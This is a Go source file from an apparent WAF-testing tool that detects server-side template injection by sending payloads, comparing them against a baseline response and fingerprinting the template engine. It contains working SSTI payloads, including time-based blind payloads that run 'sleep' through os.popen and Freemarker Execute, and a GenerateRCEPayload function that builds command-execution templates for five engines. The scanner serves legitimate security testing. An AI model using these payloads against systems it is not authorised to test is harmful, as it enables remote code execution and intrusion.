package ssti

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/regexcache"
)

// GetPayloads returns all payloads, optionally filtered
func (d *Detector) GetPayloads(engine TemplateEngine, payloadType PayloadType) []*Payload {
	filtered := make([]*Payload, 0, len(d.payloads))

	for _, p := range d.payloads {
		if engine != "" && engine != EngineUnknown && p.Engine != engine && p.Engine != EngineUnknown {
			continue
		}
		if payloadType != "" && p.Type != payloadType {
			continue
		}
		filtered = append(filtered, p)
	}

	return filtered
}

// Detect tests a URL for SSTI vulnerabilities
func (d *Detector) Detect(ctx context.Context, targetURL string, parameter string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Parse the URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Get payloads to test
	payloads := d.getFilteredPayloads()

	// Get baseline response for false positive comparison
	baselineBody := d.getBaselineBody(ctx, parsedURL, parameter)

	// Test each payload
	for i, payload := range payloads {
		if d.config.MaxPayloads > 0 && i >= d.config.MaxPayloads {
			break
		}

		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		vuln, err := d.testPayload(ctx, parsedURL, parameter, payload, baselineBody)
		if err != nil {
			continue
		}

		if vuln != nil {
			vulns = append(vulns, vuln)
			// Key matches dedup.go: URL|Parameter|Engine
			d.config.NotifyUniqueVuln(fmt.Sprintf("%s|%s|%s", targetURL, parameter, vuln.Engine))
		}
	}

	return vulns, nil
}

func (d *Detector) getFilteredPayloads() []*Payload {
	filtered := make([]*Payload, 0, len(d.payloads))

	for _, p := range d.payloads {
		// Check engine filter
		if len(d.config.Engines) > 0 {
			found := false
			for _, e := range d.config.Engines {
				if p.Engine == e || p.Engine == EngineUnknown {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}

		// Check payload type filter
		if len(d.config.PayloadTypes) > 0 {
			found := false
			for _, t := range d.config.PayloadTypes {
				if p.Type == t {
					found = true
					break
				}
			}
			if !found {
				continue
			}
		}

		// Skip dangerous payloads in safe mode
		if d.config.SafeMode && (p.Type == PayloadRCE || p.Type == PayloadSandboxEscape) {
			continue
		}

		filtered = append(filtered, p)
	}

	return filtered
}

func (d *Detector) testPayload(ctx context.Context, targetURL *url.URL, parameter string, payload *Payload, baselineBody string) (*Vulnerability, error) {
	// Build the request URL
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, payload.Template)
	testURL.RawQuery = query.Encode()

	// Create request
	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return nil, err
	}

	// Set headers
	req.Header.Set("User-Agent", d.config.UserAgent)
	for key, values := range d.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	// Add cookies
	for _, cookie := range d.config.Cookies {
		req.AddCookie(cookie)
	}

	// Send request
	start := time.Now()
	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)
	elapsed := time.Since(start)

	// Read response body (limit to 1MB for safety)
	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil && err != io.EOF {
		return nil, err
	}
	bodyStr := string(body)

	// Check for vulnerability
	vuln := d.analyzeResponse(targetURL.String(), parameter, payload, bodyStr, elapsed, baselineBody)

	return vuln, nil
}

func (d *Detector) analyzeResponse(targetURL, parameter string, payload *Payload, body string, elapsed time.Duration, baselineBody string) *Vulnerability {
	var matched bool
	var evidence string
	confidence := "low"

	// Check for expected output (math expression result)
	if payload.ExpectedOutput != "" {
		if strings.Contains(body, payload.ExpectedOutput) {
			// Skip if expected output was already in baseline (false positive)
			if baselineBody != "" && !strings.Contains(baselineBody, payload.ExpectedOutput) {
				matched = true
				evidence = payload.ExpectedOutput
				confidence = "high"
			}
		}
	}

	// Check for regex match
	if payload.Regex != nil {
		matches := payload.Regex.FindStringSubmatch(body)
		if len(matches) > 0 {
			matched = true
			evidence = matches[0]
			if confidence == "low" {
				confidence = "medium"
			}
		}
	}

	// Math expression verification (strongest indicator)
	if payload.Type == PayloadMath && payload.MathResult != 0 {
		resultStr := fmt.Sprintf("%d", payload.MathResult)
		if strings.Contains(body, resultStr) {
			// Skip if math result was already in baseline (false positive)
			if baselineBody != "" && strings.Contains(baselineBody, resultStr) {
				// Math result naturally appears in page content — likely false positive
			} else {
				matched = true
				evidence = fmt.Sprintf("Math result %d found (from %d*%d)", payload.MathResult, payload.MathA, payload.MathB)
				confidence = "high"
			}
		}
	}

	if !matched {
		return nil
	}

	return &Vulnerability{
		Vulnerability: finding.Vulnerability{
			URL:          targetURL,
			Parameter:    parameter,
			Severity:     payload.Severity,
			Evidence:     evidence,
			ResponseTime: elapsed,
		},
		Engine:         payload.Engine,
		Payload:        payload,
		Confidence:     confidence,
		CanExecuteCode: payload.Type == PayloadRCE,
	}
}

// DetectBlind performs blind SSTI detection using time-based techniques
func (d *Detector) DetectBlind(ctx context.Context, targetURL string, parameter string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	// Parse the URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	// Time-based detection payloads
	blindPayloads := d.getBlindPayloads()

	for _, payload := range blindPayloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		// First, send baseline request
		baselineTime, err := d.measureResponseTime(ctx, parsedURL, parameter, "baseline")
		if err != nil {
			continue
		}

		// Send payload
		payloadTime, err := d.measureResponseTime(ctx, parsedURL, parameter, payload.Template)
		if err != nil {
			continue
		}

		// Check if payload caused a delay
		delay := payloadTime - baselineTime
		if delay >= d.config.BlindDelay-time.Second {
			vulns = append(vulns, &Vulnerability{
				Vulnerability: finding.Vulnerability{
					URL:          targetURL,
					Parameter:    parameter,
					Severity:     finding.High,
					Evidence:     fmt.Sprintf("Time-based delay detected: baseline=%v, payload=%v, delta=%v", baselineTime, payloadTime, delay),
					ResponseTime: payloadTime,
				},
				Engine:     payload.Engine,
				Payload:    payload,
				Confidence: "medium",
			})
			// Key matches dedup.go: URL|Parameter|Engine
			d.config.NotifyUniqueVuln(fmt.Sprintf("%s|%s|%s", targetURL, parameter, payload.Engine))
		}
	}

	return vulns, nil
}

func (d *Detector) getBlindPayloads() []*Payload {
	sleepSeconds := int(d.config.BlindDelay.Seconds())

	return []*Payload{
		// Jinja2 blind
		{
			Template:    fmt.Sprintf("{{cycler.__init__.__globals__.os.popen('sleep %d').read()}}", sleepSeconds),
			Engine:      EngineJinja2,
			Type:        PayloadBlind,
			Description: "Jinja2 blind time-based",
			Severity:    finding.High,
		},
		// Freemarker blind
		{
			Template:    fmt.Sprintf(`${"freemarker.template.utility.Execute"?new()("sleep %d")}`, sleepSeconds),
			Engine:      EngineFreemarker,
			Type:        PayloadBlind,
			Description: "Freemarker blind time-based",
			Severity:    finding.High,
		},
		// ERB blind
		{
			Template:    fmt.Sprintf("<%%= `sleep %d` %%>", sleepSeconds),
			Engine:      EngineERB,
			Type:        PayloadBlind,
			Description: "ERB blind time-based",
			Severity:    finding.High,
		},
		// Mako blind
		{
			Template:    fmt.Sprintf("${__import__('time').sleep(%d)}", sleepSeconds),
			Engine:      EngineMako,
			Type:        PayloadBlind,
			Description: "Mako blind time-based",
			Severity:    finding.High,
		},
	}
}

func (d *Detector) measureResponseTime(ctx context.Context, targetURL *url.URL, parameter, value string) (time.Duration, error) {
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, value)
	testURL.RawQuery = query.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return 0, err
	}

	req.Header.Set("User-Agent", d.config.UserAgent)

	start := time.Now()
	resp, err := d.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	return time.Since(start), nil
}

// getBaselineBody fetches a response with a benign parameter value
// to compare against payload responses and avoid false positives.
func (d *Detector) getBaselineBody(ctx context.Context, targetURL *url.URL, parameter string) string {
	testURL := *targetURL
	query := testURL.Query()
	query.Set(parameter, "waftester_baseline_probe")
	testURL.RawQuery = query.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return ""
	}

	req.Header.Set("User-Agent", d.config.UserAgent)
	for key, values := range d.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}
	for _, cookie := range d.config.Cookies {
		req.AddCookie(cookie)
	}

	resp, err := d.client.Do(req)
	if err != nil {
		return ""
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, err := iohelper.ReadBodyDefault(resp.Body)
	if err != nil {
		return ""
	}
	return string(body)
}

// FingerprintEngine attempts to identify the template engine being used
func (d *Detector) FingerprintEngine(ctx context.Context, targetURL string, parameter string) (TemplateEngine, error) {
	// Use fingerprinting payloads that have unique outputs per engine.
	// Use a slice for deterministic iteration order.
	type fingerprint struct {
		payload string
		engine  TemplateEngine
	}
	fingerprints := []fingerprint{
		{"{{7*'7'}}", EngineJinja2}, // Returns "7777777" in Jinja2, error in Twig
		{"{{_self.env.registerUndefinedFilterCallback('id')}}", EngineTwig},
		{"{$smarty.version}", EngineSmarty},
		{"${.data_model}", EngineFreemarker},
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return EngineUnknown, err
	}

	for _, fp := range fingerprints {
		payload, engine := fp.payload, fp.engine
		testURL := *parsedURL
		query := testURL.Query()
		query.Set(parameter, payload)
		testURL.RawQuery = query.Encode()

		req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", d.config.UserAgent)

		resp, err := d.client.Do(req)
		if err != nil {
			continue
		}

		body, err := iohelper.ReadBodyDefault(resp.Body)
		iohelper.DrainAndClose(resp.Body) // Close immediately, not defer in loop

		if err != nil {
			continue
		}

		// Engine-specific response analysis
		switch engine {
		case EngineJinja2:
			if strings.Contains(string(body), "7777777") {
				return EngineJinja2, nil
			}
		case EngineSmarty:
			if regexcache.MustGet(`Smarty[_\-]?[0-9]`).MatchString(string(body)) {
				return EngineSmarty, nil
			}
		case EngineTwig:
			if strings.Contains(string(body), "Twig") {
				return EngineTwig, nil
			}
		case EngineFreemarker:
			bodyStr := string(body)
			if strings.Contains(bodyStr, "freemarker") || strings.Contains(bodyStr, "FreeMarker") {
				return EngineFreemarker, nil
			}
		}
	}

	return EngineUnknown, nil
}

// GetEnginePayloads returns payloads for a specific engine
func GetEnginePayloads(engine TemplateEngine, safeOnly bool) []*Payload {
	d := NewDetector(&DetectorConfig{SafeMode: safeOnly})
	return d.GetPayloads(engine, "")
}

// AllEngines returns a list of all supported template engines
func AllEngines() []TemplateEngine {
	return []TemplateEngine{
		EngineJinja2,
		EngineTwig,
		EngineFreemarker,
		EngineVelocity,
		EngineSmarty,
		EngineMako,
		EngineERB,
		EnginePebble,
		EngineThymeleaf,
		EngineNunjucks,
		EngineHandlebars,
		EngineMustache,
		EngineTornado,
		EngineDjango,
		EngineRazor,
	}
}

// PayloadGenerator generates custom SSTI payloads
type PayloadGenerator struct {
	engine TemplateEngine
}

// NewPayloadGenerator creates a new payload generator for a specific engine
func NewPayloadGenerator(engine TemplateEngine) *PayloadGenerator {
	return &PayloadGenerator{engine: engine}
}

// GenerateMathPayload generates a math-based detection payload
func (g *PayloadGenerator) GenerateMathPayload(a, b int) *Payload {
	result := a * b
	resultStr := fmt.Sprintf("%d", result)

	var template string
	switch g.engine {
	case EngineJinja2, EngineTwig, EngineNunjucks, EngineTornado:
		template = fmt.Sprintf("{{%d*%d}}", a, b)
	case EngineFreemarker, EngineMako:
		template = fmt.Sprintf("${%d*%d}", a, b)
	case EngineSmarty:
		template = fmt.Sprintf("{%d*%d}", a, b)
	case EngineERB:
		template = fmt.Sprintf("<%%= %d*%d %%>", a, b)
	case EngineThymeleaf:
		template = fmt.Sprintf("[[${%d*%d}]]", a, b)
	case EngineRazor:
		template = fmt.Sprintf("@(%d*%d)", a, b)
	default:
		template = fmt.Sprintf("{{%d*%d}}", a, b)
	}

	return &Payload{
		Template:       template,
		Engine:         g.engine,
		Type:           PayloadMath,
		ExpectedOutput: resultStr,
		Description:    fmt.Sprintf("Custom math payload for %s", g.engine),
		Severity:       finding.High,
		MathA:          a,
		MathB:          b,
		MathResult:     result,
	}
}

// GenerateRCEPayload generates an RCE payload (use with caution)
func (g *PayloadGenerator) GenerateRCEPayload(command string) *Payload {
	var template string
	switch g.engine {
	case EngineJinja2:
		template = fmt.Sprintf("{{lipsum.__globals__['os'].popen('%s').read()}}", command)
	case EngineFreemarker:
		template = fmt.Sprintf(`${"freemarker.template.utility.Execute"?new()("%s")}`, command)
	case EngineERB:
		template = fmt.Sprintf("<%%= `%s` %%>", command)
	case EngineMako:
		template = fmt.Sprintf("${__import__('os').popen('%s').read()}", command)
	case EngineTornado:
		template = fmt.Sprintf("{%%import os%%}{{os.popen('%s').read()}}", command)
	default:
		return nil
	}

	return &Payload{
		Template:    template,
		Engine:      g.engine,
		Type:        PayloadRCE,
		Description: fmt.Sprintf("RCE payload executing: %s", command),
		Severity:    finding.Critical,
	}
}

// Result represents the overall SSTI detection result
type Result struct {
	URL             string           `json:"url"`
	Parameters      []string         `json:"parameters_tested"`
	Vulnerabilities []*Vulnerability `json:"vulnerabilities"`
	DetectedEngine  TemplateEngine   `json:"detected_engine,omitempty"`
	Duration        time.Duration    `json:"duration"`
	PayloadsTested  int              `json:"payloads_tested"`
}

// ScanURL performs comprehensive SSTI scanning on a URL
func (d *Detector) ScanURL(ctx context.Context, targetURL string, parameters []string) (*Result, error) {
	start := time.Now()
	result := &Result{
		URL:        targetURL,
		Parameters: parameters,
	}

	var allVulns []*Vulnerability

	for _, param := range parameters {
		// Try to fingerprint engine first
		engine, _ := d.FingerprintEngine(ctx, targetURL, param)
		if engine != EngineUnknown {
			result.DetectedEngine = engine
		}

		// Standard detection
		vulns, err := d.Detect(ctx, targetURL, param)
		if err != nil {
			continue
		}
		allVulns = append(allVulns, vulns...)

		// Blind detection
		if !d.config.SafeMode {
			blindVulns, err := d.DetectBlind(ctx, targetURL, param)
			if err == nil {
				allVulns = append(allVulns, blindVulns...)
			}
		}
	}

	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)
	result.PayloadsTested = len(d.getFilteredPayloads()) * len(parameters)

	return result, nil
}
